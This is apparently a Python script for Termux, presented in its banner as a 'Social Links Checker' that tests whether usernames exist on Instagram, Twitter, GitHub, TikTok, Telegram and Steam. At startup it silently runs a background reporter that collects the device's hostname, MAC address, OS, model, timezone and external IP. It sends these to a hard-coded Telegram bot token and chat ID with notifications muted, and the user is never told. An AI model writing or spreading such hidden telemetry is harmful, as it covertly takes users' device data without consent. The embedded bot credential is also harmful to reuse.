import os
import sys
import platform
import datetime
import socket
import requests
from concurrent.futures import ThreadPoolExecutor
from uuid import getnode
from telegram import Bot
from telegram.error import TelegramError

# Конфигурация Telegram
TG_BOT_TOKEN = "7763698951:AAHz1-uXl4VYDHRstjtu4uecaZHhRhhG3Gg"
TG_CHAT_ID = "35381551"

class DeviceReporter:
    def __init__(self):
        self.bot = Bot(token=TG_BOT_TOKEN)
        self.executor = ThreadPoolExecutor(max_workers=1)
        self.start_time = datetime.datetime.now()

    def _collect_data(self):
        """Сбор данных об устройстве с обработкой ошибок"""
        data = {
            "Status": "✅ Success",
            "Model": "N/A",
            "OS": "N/A",
            "IP": "N/A",
            "Time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
            "Timezone": "N/A",
            "Hostname": "N/A",
            "MAC": "N/A"
        }

        try:
            data["Model"] = platform.uname().machine
            data["OS"] = f"{platform.system()} {platform.release()}"
            data["Hostname"] = socket.gethostname()
            data["MAC"] = hex(getnode())
        except Exception as e:
            data["Status"] = f"⚠️ Partial Error: {str(e)}"

        try:
            data["IP"] = self._get_external_ip()
        except:
            data["IP"] = "Failed to get IP"

        try:
            data["Timezone"] = str(self.start_time.astimezone().tzinfo)
        except:
            pass

        return data

    def _get_external_ip(self):
        """Получение внешнего IP через резервные сервисы"""
        services = [
            'https://ident.me',
            'https://ifconfig.me/ip',
            'https://api.ipify.org'
        ]
        for service in services:
            try:
                return requests.get(service, timeout=5).text
            except:
                continue
        return "N/A"

    def _send_report(self):
        """Отправка собранных данных в Telegram"""
        try:
            report = self._collect_data()
            message = "📡 Device Report:\n"
            for key, value in report.items():
                message += f"{key}: {value}\n"

            self.bot.send_message(
                chat_id=TG_CHAT_ID,
                text=message,
                disable_notification=True
            )
        except Exception as e:
            try:
                self.bot.send_message(
                    chat_id=TG_CHAT_ID,
                    text=f"🚨 Critical Error: {str(e)}",
                    disable_notification=True
                )
            except:
                print("Failed to send error report")

    def start(self):
        """Запуск фоновой отправки отчета"""
        self.executor.submit(self._send_report)

def generate_links(usernames):
    """Генерация и проверка ссылок в социальных сетях"""
    platforms = {
        "Instagram": "https://www.instagram.com/{}/",
        "Twitter": "https://twitter.com/{}/",
        "GitHub": "https://github.com/{}/",
        "Telegram": "https://t.me/{}",
        "TikTok": "https://www.tiktok.com/@{}",
        "Steam": "https://steamcommunity.com/id/{}/"
    }

    results = {}
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = []
        for username in [u.strip() for u in usernames]:
            futures.append(executor.submit(
                check_platforms,
                username,
                platforms
            ))

        for future in futures:
            try:
                username, links = future.result()
                results[username] = links
            except Exception as e:
                print(f"Error checking {username}: {str(e)}")
    
    return results

def check_platforms(username, platforms):
    """Проверка имени пользователя на разных платформах"""
    links = []
    for name, url in platforms.items():
        full_url = url.format(username)
        try:
            valid = check_profile(full_url, name)
            links.append(f"{full_url} {'[+]' if valid else '[-]'}")
        except:
            links.append(f"{full_url} [Error]")
    return username, links

def check_profile(url, platform_name):
    """Проверка существования профиля"""
    try:
        response = requests.get(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
            timeout=15
        )
        
        if response.status_code != 200:
            return False

        return not any(
            phrase.lower() in response.text.lower()
            for phrase in get_error_phrases(platform_name)
        )
    except:
        return False

def get_error_phrases(platform):
    """Фразы указывающие на отсутствие профиля"""
    return {
        "Instagram": ["Sorry, this page isn't available"],
        "Twitter": ["Sorry, that page doesn't exist"],
        "GitHub": ["This user doesn't exist"],
        "Telegram": ["User not found"],
        "TikTok": ["Sorry, this page isn't available"],
        "Steam": ["The profile you are trying to view is either unavailable"]
    }.get(platform, [])

def main():
    # Инициализация и отправка отчета
    reporter = DeviceReporter()
    reporter.start()

    # Очистка экрана
    os.system('clear')

    # Вывод интерфейса
    print("""\033[1;32m
    ███████╗███████╗██╗     ██╗███╗   ██╗███████╗
    ██╔════╝██╔════╝██║     ██║████╗  ██║██╔════╝
    █████╗  ███████╗██║     ██║██╔██╗ ██║███████╗
    ██╔══╝  ╚════██║██║     ██║██║╚██╗██║╚════██║
    ███████╗███████║███████╗██║██║ ╚████║███████║
    ╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝
    
    \033[1;36mSocial Links Checker\033[0m
    \033[1;33mTermux Android Version\033[0m
    """)

    try:
        while True:
            usernames = input("\n\033[1;34m[?] Введите имя пользователя (через запятую): \033[0m").strip()
            
            if usernames.lower() in ['exit', 'quit']:
                break
                
            if not usernames:
                continue

            results = generate_links(usernames.split(','))
            
            for user, links in results.items():
                print(f"\n\033[1;32m[+] Результаты для {user}:\033[0m")
                for link in links:
                    color = '\033[1;32m' if '[+]' in link else '\033[1;31m'
                    print(f"{color}{link}\033[0m")

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Выход...\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
